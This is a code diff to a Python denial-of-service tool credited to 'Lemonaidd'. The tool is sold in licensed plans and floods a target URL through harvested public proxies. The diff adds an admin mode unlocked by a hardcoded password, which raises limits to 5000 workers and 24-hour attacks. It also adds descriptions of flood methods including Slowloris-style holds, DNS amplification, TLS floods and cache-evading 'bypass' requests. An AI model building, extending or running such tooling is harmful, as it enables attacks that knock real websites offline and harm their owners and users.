@@ -158,6 +158,37 @@ current_license = {
     'expires': datetime.now() + timedelta(days=5)
 }
 
+# Admin mode
+admin_mode = False
+ADMIN_PASSWORD = "newnew@123"
+ADMIN_WORKERS = 5000
+ADMIN_DURATION = 86400  # 24 hours
+# All methods (unique from all plans, plus maybe extra)
+ALL_METHODS = sorted(list(set(
+    method for plan in PLANS.values() for method in plan['methods']
+)))  # already includes bypass methods
+
+# Method descriptions (for display)
+METHOD_DESCRIPTIONS = {
+    'HTTP GET': 'Standard HTTP GET requests – simple and fast.',
+    'HTTPS GET': 'Encrypted HTTPS GET requests – bypasses some filters.',
+    'HTTP POST': 'HTTP POST with random data – consumes more resources.',
+    'HTTPS POST': 'Encrypted POST requests – good for SSL targets.',
+    'CURL': 'Simulates cURL client – generic but effective.',
+    'GET/POST MIX': 'Alternates between GET and POST – unpredictable.',
+    'BROWSER': 'Emulates a full browser with extra headers.',
+    'HULK': 'Slowloris‑style – keeps connections open.',
+    'DNS-AMP': 'Amplified DNS queries (if target is DNS).',
+    'STRESS TEST': 'Burst of 50 rapid requests – high RPS.',
+    'TLS-VIP': 'Multiple TLS connections – CPU intensive.',
+    'CONCURRENT HOLD': '99 parallel requests per worker – max concurrency.',
+    'SOCKET-AMP': 'Socket‑level amplification.',
+    'NET-BYPASS': '100 rapid requests with varying paths.',
+    'BYPASS-GET': 'GET with random path, query, and headers.',
+    'BYPASS-POST': 'POST with random payload and headers.',
+    'RANDOM-PATH': 'GET with random URL path – evades caching.',
+}
+
 USER_AGENTS = {
     'user_agents': [
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
@@ -314,14 +345,14 @@ last_proxy_refresh = 0
 PROXY_REFRESH_INTERVAL = 300   # seconds
 
 async def fetch_proxies_from_source(source_url, proxy_type='http'):
-    """Fetch proxies from a given source URL and return a list of URLs."""
+    """Fetch proxies from a given source URL with timeout."""
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get(source_url, timeout=10) as resp:
+        timeout = aiohttp.ClientTimeout(total=10)
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            async with session.get(source_url) as resp:
                 if resp.status != 200:
                     return []
                 text = await resp.text()
-                # Expect plain text with IP:PORT lines
                 lines = text.strip().split('\n')
                 proxies = []
                 for line in lines:
@@ -333,7 +364,7 @@ async def fetch_proxies_from_source(source_url, proxy_type='http'):
         return []
 
 async def fetch_proxies_from_multiple_sources():
-    """Gather proxies from various public sources."""
+    """Gather proxies from various public sources with concurrency limit."""
     sources = [
         ('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=10000&country=all&ssl=all&anonymity=all', 'http'),
         ('https://www.proxy-list.download/api/v1/get?type=http', 'http'),
@@ -348,53 +379,23 @@ async def fetch_proxies_from_multiple_sources():
     for res in results:
         if isinstance(res, list):
             all_proxies.extend(res)
-    # Remove duplicates
-    all_proxies = list(set(all_proxies))
-    return all_proxies
-
-async def validate_proxy(proxy_url, test_url='http://httpbin.org/ip', timeout=5):
-    """Test if a proxy works by making a request through it."""
-    try:
-        connector = None
-        if HAS_SOCKS and proxy_url.startswith('socks'):
-            # parse proxy_url: socks5://user:pass@host:port or socks5://host:port
-            # aiohttp_socks uses ProxyConnector
-            # For simplicity, we'll use aiohttp with proxy parameter, which supports socks via aiohttp_socks
-            pass  # aiohttp's proxy parameter works with socks if aiohttp_socks is installed
-        async with aiohttp.ClientSession() as session:
-            async with session.get(test_url, proxy=proxy_url, timeout=timeout) as resp:
-                if resp.status == 200:
-                    return True
-    except:
-        return False
-    return False
+    return list(set(all_proxies))
 
 async def refresh_proxy_list(force=False):
-    """Fetch and validate proxies, update the global proxy_list."""
+    """Fetch and update proxy list in background."""
     global proxy_list, last_proxy_refresh
     now = time.time()
     if not force and (now - last_proxy_refresh) < PROXY_REFRESH_INTERVAL:
-        return  # not time to refresh yet
-    print(f"{current_color}[*] Refreshing proxy list...{RESET}")
-    raw_proxies = await fetch_proxies_from_multiple_sources()
-    if not raw_proxies:
-        print(f"{current_color}[!] No proxies fetched, keeping old list.{RESET}")
         return
-    # Validate a sample (optional, can be time-consuming)
-    # We'll just trust the sources for now, but you could validate a few
-    validated = []
-    # Optionally test a few (e.g., first 10) to ensure they're alive
-    test_sample = raw_proxies[:20]  # test only first 20 to save time
-    for proxy in test_sample:
-        if await validate_proxy(proxy):
-            validated.append(proxy)
-    # Add the rest untested (but we assume they're good)
-    # validated.extend(raw_proxies[20:])  # if you want to include untested
-    # For now, we'll include all raw proxies (trust sources)
-    async with proxy_lock:
-        proxy_list = raw_proxies
-        last_proxy_refresh = now
-    print(f"{current_color}[+] Proxy list updated: {len(proxy_list)} proxies.{RESET}")
+    print(f"{current_color}[*] Refreshing proxy list in background...{RESET}")
+    raw_proxies = await fetch_proxies_from_multiple_sources()
+    if raw_proxies:
+        async with proxy_lock:
+            proxy_list = raw_proxies
+            last_proxy_refresh = now
+        print(f"{current_color}[+] Proxy list updated: {len(proxy_list)} proxies.{RESET}")
+    else:
+        print(f"{current_color}[!] No proxies fetched, keeping old list ({len(proxy_list)} proxies).{RESET}")
 
 def get_random_proxy():
     if proxy_list:
@@ -417,13 +418,14 @@ def clear_screen():
 def header():
     clear_screen()
     plan_info = PLANS[current_license['plan']]
+    admin_indicator = " [ADMIN]" if admin_mode else ""
     
     print(f"""
 {current_color}{BOLD}
 {ASCII_MENUS[current_ascii]}
   Made by: Lemonaidd  
 {RESET}
-{current_color} User: {plan_info['name']} •{RESET}
+{current_color} User: {plan_info['name']}{admin_indicator} •{RESET}
 {current_color}
   ┌────────────────────────────────────┐
   │ [1] Launch Attack                  │
@@ -434,6 +436,7 @@ def header():
   │ [6] Change ASCII Menu              │
   │ [7] Refresh                        │
   │ [8] Proxy Settings                  │
+  │ [9] Admin Panel                     │
   │ [0] Exit                           │
   └────────────────────────────────────┘
 {RESET}""")
@@ -593,15 +596,22 @@ async def http_worker(session, url, end_time, worker_id, method):
             await asyncio.sleep(random.uniform(0.5, 2.0))
 
 def select_method():
-    plan_info = PLANS[current_license['plan']]
-    available_methods = plan_info['methods']
+    if admin_mode:
+        available_methods = ALL_METHODS
+        plan_name = "ADMIN"
+    else:
+        plan_info = PLANS[current_license['plan']]
+        available_methods = plan_info['methods']
+        plan_name = plan_info['name']
     
     clear_screen()
     print(f"{current_color}{BOLD}╔══ SELECT ATTACK METHOD ══╗{RESET}\n")
-    print(f"  Available methods for {plan_info['name']}:\n")
+    print(f"  Available methods for {plan_name}:\n")
     
     for idx, method in enumerate(available_methods, 1):
+        desc = METHOD_DESCRIPTIONS.get(method, 'No description available.')
         print(f"{current_color}  {idx}) {RESET}{method}")
+        print(f"      {desc}")
     
     print(f"\n{current_color}{BOLD}╚═══════════════════════════╝{RESET}")
     
@@ -619,9 +629,17 @@ def select_method():
         return available_methods[0]
 
 async def run_load_test():
-    plan_info = PLANS[current_license['plan']]
+    if admin_mode:
+        max_workers = ADMIN_WORKERS
+        max_duration = ADMIN_DURATION
+        plan_name = "ADMIN"
+    else:
+        plan_info = PLANS[current_license['plan']]
+        max_workers = plan_info['workers']
+        max_duration = plan_info['duration']
+        plan_name = plan_info['name']
     
-    if datetime.now() > current_license['expires']:
+    if datetime.now() > current_license['expires'] and not admin_mode:
         clear_screen()
         print(f"{current_color}{BOLD}╔══ LICENSE EXPIRED ══╗{RESET}")
         print(f"\n  Your license has expired!")
@@ -645,25 +663,30 @@ async def run_load_test():
     method = select_method()
 
     try:
-        workers = int(input(f"\n Concurrent Per workers (max {plan_info['workers']}) → ") or plan_info['workers'])
-        workers = min(workers, plan_info['workers'])
+        workers = int(input(f"\n Concurrent Per workers (max {max_workers}) → ") or max_workers)
+        workers = min(workers, max_workers)
     except:
-        workers = min(10, plan_info['workers'])
+        workers = min(10, max_workers)
 
     try:
-        duration = int(input(f"  Duration in seconds (max {plan_info['duration']}) → ") or 60)
-        duration = min(duration, plan_info['duration'])
+        duration = int(input(f"  Duration in seconds (max {max_duration}) → ") or 60)
+        duration = min(duration, max_duration)
     except:
-        duration = min(60, plan_info['duration'])
+        duration = min(60, max_duration)
+
+    # Start proxy refresh in background if enabled
+    if proxies_enabled:
+        asyncio.create_task(refresh_proxy_list(force=True))
 
     print(f"\n{current_color}{BOLD}Starting attack...{RESET}")
+    print(f"  Plan: {plan_name}")
     print(f"  Method: {method}")
     print(f"  Target: {url}")
     print(f"  Workers: {workers}")
     print(f"  Duration: {duration}s")
     if proxies_enabled:
         async with proxy_lock:
-            print(f"  Proxies: Enabled ({len(proxy_list)} loaded)")
+            print(f"  Proxies: Enabled ({len(proxy_list)} loaded initially)")
     else:
         print(f"  Proxies: Disabled")
 
@@ -674,10 +697,6 @@ async def run_load_test():
     stats["status_codes"] = Counter()
     stats["running"] = True
     stats["active_agents"] = []
-
-    # If proxies are enabled, ensure we have a fresh list at attack start
-    if proxies_enabled:
-        await refresh_proxy_list(force=True)
 
     connector = aiohttp.TCPConnector(limit=workers, ssl=False)
     async with aiohttp.ClientSession(connector=connector) as session:
@@ -706,8 +725,8 @@ async def run_load_test():
                     avg_latency = sum(stats["latencies"]) / len(stats["latencies"]) * 1000
 
                 clear_screen()
-                print(f"{current_color}{BOLD}╔══ ATTACK SENT SUCCESSFULLY ══╗{RESET}\n")
-                print(f"{current_color}  Plan: {RESET}{plan_info['name']}")
+                print(f"{current_color}{BOLD}╔══ ATTACK IN PROGRESS ══╗{RESET}\n")
+                print(f"{current_color}  Plan: {RESET}{plan_name}")
                 print(f"{current_color}  Method: {RESET}{method}")
                 print(f"{current_color}  Target: {RESET}{url}")
                 print(f"{current_color}  Workers: {RESET}{workers}")
@@ -749,6 +768,17 @@ async def run_load_test():
     input(f"\n  Press ENTER to return...")
 
 def test_config_screen():
+    if admin_mode:
+        print(f"{current_color}{BOLD}╔══ ADMIN METHODS ══╗{RESET}\n")
+        print("  All methods are available:\n")
+        for method in ALL_METHODS:
+            desc = METHOD_DESCRIPTIONS.get(method, '')
+            print(f"  • {method}")
+            if desc:
+                print(f"      {desc}")
+        input(f"\n  Press ENTER...")
+        return
+
     plan_info = PLANS[current_license['plan']]
     
     clear_screen()
@@ -758,7 +788,10 @@ def test_config_screen():
     print(f"{current_color}  Max Duration: {RESET}{plan_info['duration']}s")
     print(f"\n{current_color}  Available Methods:{RESET}")
     for method in plan_info['methods']:
+        desc = METHOD_DESCRIPTIONS.get(method, '')
         print(f"    • {method}")
+        if desc:
+            print(f"      {desc}")
     print(f"\n{current_color}  Features:{RESET}")
     print("    • Heavy Request flow")
     print("    • Strong connection flow")
@@ -811,6 +844,14 @@ def view_test_agents():
 
 def plan_and_license():
     global current_license
+    
+    if admin_mode:
+        print(f"{current_color}{BOLD}╔══ ADMIN MODE ══╗{RESET}")
+        print("\n  In admin mode, plan limits are overridden.")
+        print(f"  Max workers: {ADMIN_WORKERS}")
+        print(f"  Max duration: {ADMIN_DURATION}s")
+        input(f"\n  Press ENTER...")
+        return
     
     clear_screen()
     print(f"{current_color}{BOLD}╔══ PLAN MANAGEMENT ══╗{RESET}\n")
@@ -915,7 +956,6 @@ async def proxy_settings():
         proxies_enabled = not proxies_enabled
         print(f"  Proxies now {'enabled' if proxies_enabled else 'disabled'}.")
         if proxies_enabled:
-            # Try to fetch proxies immediately
             asyncio.create_task(refresh_proxy_list(force=True))
         time.sleep(1)
     elif choice == '2':
@@ -937,7 +977,7 @@ async def proxy_settings():
                 if re.match(r'^(https?|socks[45])://', line):
                     new_proxies.append(line)
                 elif re.match(r'\d+\.\d+\.\d+\.\d+:\d+', line):
-                    new_proxies.append(f"http://{line}")  # assume HTTP
+                    new_proxies.append(f"http://{line}")
             async with proxy_lock:
                 proxy_list.extend(new_proxies)
                 # deduplicate
@@ -954,6 +994,30 @@ async def proxy_settings():
         time.sleep(2)
     else:
         return
+
+def admin_login():
+    global admin_mode
+    clear_screen()
+    print(f"{current_color}{BOLD}╔══ ADMIN PANEL ══╗{RESET}\n")
+    if admin_mode:
+        print("  You are already in admin mode.")
+        logout = input("  Logout? (y/n) → ").strip().lower()
+        if logout in ['y', 'yes']:
+            admin_mode = False
+            print("  Logged out.")
+        else:
+            print("  Staying in admin mode.")
+        time.sleep(1)
+        return
+    pwd = input("  Enter admin password → ").strip()
+    if pwd == ADMIN_PASSWORD:
+        admin_mode = True
+        print(f"\n  {current_color}✓ Admin mode activated!{RESET}")
+        print(f"  Workers: {ADMIN_WORKERS} | Duration: {ADMIN_DURATION}s")
+        print("  All methods unlocked.")
+    else:
+        print("\n  ✗ Incorrect password.")
+    time.sleep(2)
 
 def main():
     while True:
@@ -981,6 +1045,8 @@ def main():
             time.sleep(0.3)
         elif choice == "8":
             asyncio.run(proxy_settings())
+        elif choice == "9":
+            admin_login()
         else:
             print(f"  Invalid selection.")
             time.sleep(1)
